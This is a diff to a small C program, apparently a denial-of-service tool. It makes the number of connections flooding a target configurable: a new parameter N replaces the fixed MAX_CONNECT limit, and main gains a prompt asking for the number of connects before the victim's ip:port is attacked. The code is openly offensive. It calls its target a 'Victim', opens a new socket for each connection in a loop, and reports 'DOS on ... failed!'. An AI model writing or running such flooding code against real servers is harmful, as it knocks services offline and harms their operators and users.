@@ -5,7 +5,7 @@
 #include "dos.h"
 
 
-int dos(struct Victim target) {
+int dos(struct Victim target, int N) {
     int protocol, connect_fd, number_of_syncs = 0;
     ssize_t bytes_sent;
     struct sockaddr_in server_addr;
@@ -21,7 +21,7 @@ int dos(struct Victim target) {
 
 
     // Send SYNC MAX_CONNECT times
-    while (MAX_CONNECT > number_of_syncs) {
+    while (N > number_of_syncs) {
         number_of_syncs++;
         addr_len = sizeof(server_addr);
         //Create new socket for every new ping
@@ -71,6 +71,7 @@ int main(void) {
     char ip[20];
     uint16_t port;
     struct Victim target;
+    int number_of_connects;
     while (TRUE) {
         memset(&target, 0, sizeof(target));
         memset(ip, 0, sizeof(ip));
@@ -78,7 +79,9 @@ int main(void) {
         scanf("%[^:]:%hu", ip, &port);
         strcpy(target.ip_address, ip);
         target.port = port;
-        if (dos(target) == -1) {
+        printf("Enter number of connects\n");
+        scanf("%i", &number_of_connects);
+        if (dos(target, number_of_connects) == -1) {
             fprintf(stderr, "DOS on %s:%hu failed!\n", target.ip_address, target.port);
         } else {
             printf("Dos completed! \n");
